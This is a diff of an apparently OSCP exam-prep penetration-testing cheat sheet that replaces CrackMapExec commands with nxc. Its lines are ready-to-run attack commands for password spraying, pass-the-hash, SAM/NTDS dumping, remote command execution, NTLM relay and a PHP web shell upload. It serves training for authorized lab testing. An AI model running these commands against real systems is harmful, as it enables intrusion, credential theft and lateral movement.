@@ -173,7 +173,7 @@ tmux new -s oscp
 
 ```bash
 which nmap autorecon gobuster feroxbuster ffuf nikto whatweb wpscan \
-      hydra hashcat john crackmapexec impacket-psexec evil-winrm \
+      hydra hashcat john nxc impacket-psexec evil-winrm \
       bloodhound-python responder ligolo-ng chisel socat msfconsole \
       searchsploit enum4linux smbclient smbmap ldapsearch snmpwalk \
       sqlmap burpsuite
@@ -443,7 +443,7 @@ hashcat -m 22921 id_rsa.hash rockyou.txt
 hydra -l root -P rockyou.txt $IP ssh -t 4
 hydra -L users.txt -P rockyou.txt $IP ssh -t 4 -V
 # Slow but effective spray:
-crackmapexec ssh $IP -u users.txt -p passwords.txt
+nxc ssh $IP -u users.txt -p passwords.txt
 
 # ── COMMON DEFAULT CREDS ──────────────────────────────────────
 # root:root | admin:admin | pi:raspberry | vagrant:vagrant
@@ -671,15 +671,15 @@ curl -X PUT http://$IP/shell.php -d "<?php system(\$_GET['cmd']); ?>"
 # ── FINGERPRINT ───────────────────────────────────────────────
 nmap -sV -p139,445 $IP
 nmap --script smb-os-discovery,smb-security-mode,smb2-security-mode -p445 $IP
-crackmapexec smb $IP   # Shows OS, hostname, domain, SMB signing status
+nxc smb $IP   # Shows OS, hostname, domain, SMB signing status
 
 # ── NULL SESSION / ANONYMOUS ──────────────────────────────────
 smbclient -L //$IP -N                     # List shares (no auth)
 smbmap -H $IP                             # Map shares
 smbmap -H $IP -u '' -p ''                 # Explicit null
 smbmap -H $IP -u 'guest' -p ''
-crackmapexec smb $IP --shares -u '' -p ''
-crackmapexec smb $IP --shares -u 'guest' -p ''
+nxc smb $IP --shares -u '' -p ''
+nxc smb $IP --shares -u 'guest' -p ''
 
 # ── CONNECT TO SHARES ─────────────────────────────────────────
 smbclient //$IP/SHARE -N
@@ -705,14 +705,14 @@ mount -t cifs //$IP/SHARE /mnt/smb -o user=user,password=pass,domain=DOMAIN
 enum4linux -a $IP 2>/dev/null | tee scans/smb/enum4linux.txt
 enum4linux-ng $IP -A -oA scans/smb/enum4linux-ng 2>/dev/null
 
-# CrackMapExec full sweep
-crackmapexec smb $IP -u user -p pass --shares
-crackmapexec smb $IP -u user -p pass --sessions
-crackmapexec smb $IP -u user -p pass --users
-crackmapexec smb $IP -u user -p pass --groups
-crackmapexec smb $IP -u user -p pass --computers
-crackmapexec smb $IP -u user -p pass --loggedon-users
-crackmapexec smb $IP -u user -p pass --disks
+# nxc full sweep
+nxc smb $IP -u user -p pass --shares
+nxc smb $IP -u user -p pass --sessions
+nxc smb $IP -u user -p pass --users
+nxc smb $IP -u user -p pass --groups
+nxc smb $IP -u user -p pass --computers
+nxc smb $IP -u user -p pass --loggedon-users
+nxc smb $IP -u user -p pass --disks
 nxc smb $IP -u '' -p '' --rid-brute
 
 
@@ -723,8 +723,8 @@ nmap --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve2009-3103,smb-vuln
 python3 checker.py $IP    # From exploit repo
 
 # ── PASS THE HASH VIA SMB ─────────────────────────────────────
-crackmapexec smb $IP -u user -H NTLMHASH
-crackmapexec smb $IP -u Administrator -H HASH --sam
+nxc smb $IP -u user -H NTLMHASH
+nxc smb $IP -u Administrator -H HASH --sam
 smbclient //$IP/SHARE -U user --pw-nt-hash NTLMHASH
 
 # ── TIPS ──────────────────────────────────────────────────────
@@ -859,7 +859,7 @@ rpcclient> lookupsids S-1-5-21-xxx-xxx-xxx-1000   # Get username for SID
 for i in $(seq 500 1200); do
   rpcclient -U "" -N $IP -c "queryuser $(printf '0x%x' $i)" 2>/dev/null | grep -i "user name"
 done
-# Or with crackmapexec:
+# Or with nxc:
 nxc smb $IP -u '' -p '' --rid-brute
 
 
@@ -1016,8 +1016,8 @@ EXEC master.sys.xp_dirtree '\\LHOST\share';
 
 # ── NMAP + CME ────────────────────────────────────────────────
 nmap --script ms-sql-info,ms-sql-config,ms-sql-empty-password -p1433 $IP
-crackmapexec mssql $IP -u user -p pass -q "SELECT @@version"
-crackmapexec mssql $IP -u user -p pass --local-auth -q "EXEC xp_cmdshell 'whoami'"
+nxc mssql $IP -u user -p pass -q "SELECT @@version"
+nxc mssql $IP -u user -p pass --local-auth -q "EXEC xp_cmdshell 'whoami'"
 ```
 
 </details>
@@ -1069,7 +1069,7 @@ tscon 1 /dest:console   # Hijack another user's session!
 ```bash
 # ── CHECK IF ACCESSIBLE ───────────────────────────────────────
 nmap -p5985,5986 $IP
-crackmapexec winrm $IP -u user -p pass
+nxc winrm $IP -u user -p pass
 
 # ── EVIL-WINRM (best tool) ────────────────────────────────────
 evil-winrm -i $IP -u user -p pass
@@ -2362,12 +2362,12 @@ medusa -h $IP -u admin -P rockyou.txt -M http -m DIR:/admin -T 10
 medusa -h $IP -u admin -P rockyou.txt -M ssh
 medusa -h $IP -u admin -P rockyou.txt -M ftp
 
-# ── CRACKMAPEXEC (Windows) ────────────────────────────────────
-crackmapexec smb $IP -u admin -P rockyou.txt
-crackmapexec ssh $IP -u admin -p rockyou.txt
-crackmapexec winrm $IP -u users.txt -p rockyou.txt
+# ── nxc (Windows) ────────────────────────────────────
+nxc smb $IP -u admin -P rockyou.txt
+nxc ssh $IP -u admin -p rockyou.txt
+nxc winrm $IP -u users.txt -p rockyou.txt
 # Single password spray:
-crackmapexec smb $IP -u users.txt -p 'Password123' --continue-on-success
+nxc smb $IP -u users.txt -p 'Password123' --continue-on-success
 # Output: green [+] = valid, red [-] = invalid
 ```
 
@@ -2563,7 +2563,7 @@ Get-GPPPassword
 
 ```
 PHASE 1: UNAUTHENTICATED
-  ├── Enumerate: nmap, crackmapexec, ldapsearch, enum4linux
+  ├── Enumerate: nmap, nxc, ldapsearch, enum4linux
   ├── Poison: Responder (LLMNR/NBT-NS) → NTLMv2 hashes
   ├── AS-REP Roast: users with no preauth
   └── Password spray: common passwords against all users
@@ -2573,7 +2573,7 @@ PHASE 2: AUTHENTICATED (low-priv user)
   ├── Kerberoast: crack service account hashes
   ├── ACL abuse: check GenericAll, WriteDACL etc.
   ├── Check local admin: Find-LocalAdminAccess
-  ├── Enumerate shares: crackmapexec --shares
+  ├── Enumerate shares: nxc --shares
   └── Check GPP, unattend.xml, scripts in SYSVOL
 
 PHASE 3: LATERAL MOVEMENT
@@ -2594,10 +2594,10 @@ PHASE 4: DOMAIN ADMIN
 
 ```bash
 # ── INITIAL RECON ─────────────────────────────────────────────
-# CrackMapExec fingerprint (even without creds):
-crackmapexec smb $IP              # Shows: OS, hostname, domain, signing
-crackmapexec smb $IP --shares -u '' -p ''   # Null session shares
-crackmapexec smb $IP --shares -u 'guest' -p ''
+# nxc fingerprint (even without creds):
+nxc smb $IP              # Shows: OS, hostname, domain, signing
+nxc smb $IP --shares -u '' -p ''   # Null session shares
+nxc smb $IP --shares -u 'guest' -p ''
 
 # Enum4linux (null session):
 enum4linux -a $IP 2>/dev/null | tee loot/ad/enum4linux.txt
@@ -2615,7 +2615,7 @@ rpcclient -U "" -N $IP -c "querydominfo"
 for i in $(seq 1 1000); do
   rpcclient -U "" -N $IP -c "queryuser $(printf '0x%x' $i)" 2>/dev/null | grep "User Name"
 done
-crackmapexec smb $IP -u '' -p '' --rid-brute | tee loot/ad/rid_cycle.txt
+nxc smb $IP -u '' -p '' --rid-brute | tee loot/ad/rid_cycle.txt
 
 # ── LDAP ANONYMOUS ────────────────────────────────────────────
 ldapsearch -x -H ldap://$IP -b "dc=$(echo $DOMAIN | tr '.' ','|sed 's/,/,dc=/g')" 2>/dev/null | tee loot/ad/ldap_anon.txt
@@ -2652,7 +2652,7 @@ hashcat -m 5600 loot/hashes/ntlmv2.txt rockyou.txt
 hashcat -m 5600 loot/hashes/ntlmv2.txt rockyou.txt -r best64.rule
 
 # ── NTLM RELAY ATTACK ─────────────────────────────────────────
-# Condition: SMB signing disabled on target (crackmapexec confirms)
+# Condition: SMB signing disabled on target (nxc confirms)
 # Step 1: Disable SMB/HTTP in Responder.conf
 sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf
 sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
@@ -2844,12 +2844,12 @@ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 impacket-psexec $DOMAIN/Administrator@$IP -hashes :NTLMHASH
 impacket-wmiexec $DOMAIN/Administrator@$IP -hashes :NTLMHASH
 evil-winrm -i $IP -u Administrator -H NTLMHASH
-crackmapexec smb $IP -u Administrator -H NTLMHASH -x 'whoami'
+nxc smb $IP -u Administrator -H NTLMHASH -x 'whoami'
 
 # ── SPRAY DA HASH EVERYWHERE ──────────────────────────────────
-crackmapexec smb 10.10.10.0/24 -u Administrator -H NTLMHASH --continue-on-success
+nxc smb 10.10.10.0/24 -u Administrator -H NTLMHASH --continue-on-success
 # Local admin hash spray (built-in Administrator is same on all):
-crackmapexec smb 10.10.10.0/24 -u Administrator -H NTLMHASH --local-auth
+nxc smb 10.10.10.0/24 -u Administrator -H NTLMHASH --local-auth
 
 # ── DUMP LSASS (for more creds) ───────────────────────────────
 # From admin shell:
@@ -2933,11 +2933,11 @@ impacket-smbexec $DOMAIN/user:pass@$IP              # SMB — no binary on disk
 impacket-atexec $DOMAIN/user:pass@$IP "whoami"      # Task scheduler
 impacket-dcomexec $DOMAIN/user:pass@$IP 'id' -object MMC20  # DCOM
 
-# ── CRACKMAPEXEC ──────────────────────────────────────────────
-crackmapexec smb $IP -u user -p pass -x 'whoami'           # cmd
-crackmapexec smb $IP -u user -p pass -X 'Get-Process'      # PowerShell
-crackmapexec winrm $IP -u user -p pass -x 'whoami'
-crackmapexec smb $IP/24 -u admin -H HASH -x 'whoami' --continue-on-success  # Spray
+# ── nxc ──────────────────────────────────────────────
+nxc smb $IP -u user -p pass -x 'whoami'           # cmd
+nxc smb $IP -u user -p pass -X 'Get-Process'      # PowerShell
+nxc winrm $IP -u user -p pass -x 'whoami'
+nxc smb $IP/24 -u admin -H HASH -x 'whoami' --continue-on-success  # Spray
 
 # ── EVIL-WINRM ────────────────────────────────────────────────
 evil-winrm -i $IP -u user -p pass
@@ -3898,10 +3898,10 @@ evil-winrm -i IP -u user -H NTLMHASH    # PtH
 xfreerdp /u:user /p:pass /v:IP +clipboard /dynamic-resolution /cert-ignore
 xfreerdp /u:Administrator /pth:NTLMHASH /v:IP  # PtH (RestrictedAdmin mode)
 
-# ── CRACKMAPEXEC SPREAD ───────────────────────────────────────
+# ── nxc SPREAD ───────────────────────────────────────
 # After DA — spray creds/hashes on entire subnet:
-crackmapexec smb 10.10.10.0/24 -u Administrator -H HASH --local-auth --continue-on-success
-crackmapexec smb 10.10.10.0/24 -u Administrator -H HASH --local-auth -x 'whoami'
+nxc smb 10.10.10.0/24 -u Administrator -H HASH --local-auth --continue-on-success
+nxc smb 10.10.10.0/24 -u Administrator -H HASH --local-auth -x 'whoami'
 ```
 
 </details>
@@ -4874,44 +4874,44 @@ impacket-psexec    DOMAIN/user@IP -no-pass -k
 </details>
 
 <details>
-<summary>⚡ 19.3 CrackMapExec Full Reference</summary>
+<summary>⚡ 19.3 nxc Full Reference</summary>
 
 ```bash
 # ── SMB ───────────────────────────────────────────────────────
-crackmapexec smb IP -u user -p pass
-crackmapexec smb IP -u user -H NTLMHASH          # PtH
-crackmapexec smb IP -u users.txt -p pass          # User spray
-crackmapexec smb IP -u user -p passwords.txt      # Pass spray
-crackmapexec smb IP -u user -p pass --shares      # List shares
-crackmapexec smb IP -u user -p pass --sessions    # Active sessions
-crackmapexec smb IP -u user -p pass --users       # Domain users
-crackmapexec smb IP -u user -p pass --groups      # Domain groups
-crackmapexec smb IP -u user -p pass --computers   # Domain computers
-crackmapexec smb IP -u user -p pass --loggedon-users
-crackmapexec smb IP -u user -p pass --sam         # Dump SAM
-crackmapexec smb IP -u user -p pass --lsa         # Dump LSA
-crackmapexec smb IP -u user -p pass --ntds        # Dump NTDS (DC only)
-crackmapexec smb IP -u user -p pass -x 'whoami'   # Run cmd command
-crackmapexec smb IP -u user -p pass -X 'Get-Process'  # Run PS command
-crackmapexec smb IP -u user -p pass --local-auth  # Local account auth
-crackmapexec smb IP/24 -u admin -H HASH --local-auth --continue-on-success
+nxc smb IP -u user -p pass
+nxc smb IP -u user -H NTLMHASH          # PtH
+nxc smb IP -u users.txt -p pass          # User spray
+nxc smb IP -u user -p passwords.txt      # Pass spray
+nxc smb IP -u user -p pass --shares      # List shares
+nxc smb IP -u user -p pass --sessions    # Active sessions
+nxc smb IP -u user -p pass --users       # Domain users
+nxc smb IP -u user -p pass --groups      # Domain groups
+nxc smb IP -u user -p pass --computers   # Domain computers
+nxc smb IP -u user -p pass --loggedon-users
+nxc smb IP -u user -p pass --sam         # Dump SAM
+nxc smb IP -u user -p pass --lsa         # Dump LSA
+nxc smb IP -u user -p pass --ntds        # Dump NTDS (DC only)
+nxc smb IP -u user -p pass -x 'whoami'   # Run cmd command
+nxc smb IP -u user -p pass -X 'Get-Process'  # Run PS command
+nxc smb IP -u user -p pass --local-auth  # Local account auth
+nxc smb IP/24 -u admin -H HASH --local-auth --continue-on-success
 
 # ── WINRM ─────────────────────────────────────────────────────
-crackmapexec winrm IP -u user -p pass
-crackmapexec winrm IP -u user -p pass -x 'whoami'
+nxc winrm IP -u user -p pass
+nxc winrm IP -u user -p pass -x 'whoami'
 
 # ── SSH ───────────────────────────────────────────────────────
-crackmapexec ssh IP -u user -p pass
-crackmapexec ssh IP/24 -u root -p passwords.txt
+nxc ssh IP -u user -p pass
+nxc ssh IP/24 -u root -p passwords.txt
 
 # ── MSSQL ─────────────────────────────────────────────────────
-crackmapexec mssql IP -u sa -p pass -q "SELECT @@version"
-crackmapexec mssql IP -u sa -p pass --local-auth
-crackmapexec mssql IP -u sa -p pass -x "whoami"  # xp_cmdshell
+nxc mssql IP -u sa -p pass -q "SELECT @@version"
+nxc mssql IP -u sa -p pass --local-auth
+nxc mssql IP -u sa -p pass -x "whoami"  # xp_cmdshell
 
 # ── RDP ───────────────────────────────────────────────────────
-crackmapexec rdp IP -u user -p pass
-crackmapexec rdp IP/24 -u Administrator -p 'Password123'
+nxc rdp IP -u user -p pass
+nxc rdp IP/24 -u Administrator -p 'Password123'
 
 # ── OUTPUT INTERPRETATION ─────────────────────────────────────
 # [+] GREEN  = Authentication success
@@ -5043,7 +5043,7 @@ GetNPUsers.py DOMAIN/ -dc-ip IP -request -no-pass -usersfile users.txt
 GetUserSPNs.py DOMAIN/user:pass -dc-ip IP -request
 
 # Spray single password:
-crackmapexec smb IP -u users.txt -p 'Password123' --continue-on-success
+nxc smb IP -u users.txt -p 'Password123' --continue-on-success
 
 # Dump everything after DA:
 impacket-secretsdump DOMAIN/Administrator:pass@DC_IP
@@ -5113,7 +5113,7 @@ autorecon ALL_IPS --single-target --output ~/oscp/ &
 
 # ── FIRST ACTIONS BASED ON OPEN PORTS ────────────────────────
 # BOF machine → start immediately (Section 17)
-# SMB open everywhere → run crackmapexec fingerprint
+# SMB open everywhere → run nxc fingerprint
 # Port 88 open → it's an AD machine → note DC IP
 # Port 80 open → browse immediately, run gobuster
 ```
@@ -5254,7 +5254,7 @@ REPORT SUBMISSION:
 
 # 1. Password reuse across ALL services (do this EVERY time you find creds)
 for svc in ssh smb winrm rdp mssql ftp; do
-  crackmapexec $svc $IP -u user -p pass 2>/dev/null | grep -v "[-]"
+  nxc $svc $IP -u user -p pass 2>/dev/null | grep -v "[-]"
 done
 
 # 2. /etc/crontab AND /var/spool/cron/crontabs — different locations!
@@ -5296,8 +5296,8 @@ sleep 60 && cat /tmp/pspy.log | grep "root\|UID=0" | grep -v "pspy"
 mysql -u root -p -e "SHOW variables LIKE 'secure_file_priv';"
 
 # 11. GPP passwords in SYSVOL (if you have any domain user creds):
-crackmapexec smb $DC -u user -p pass -M gpp_password
-crackmapexec smb $DC -u user -p pass -M gpp_autologin
+nxc smb $DC -u user -p pass -M gpp_password
+nxc smb $DC -u user -p pass -M gpp_autologin
 # Manual:
 smbclient //DC/SYSVOL -U user%pass
 # find Groups.xml and decrypt with: gpp-decrypt "HASH"
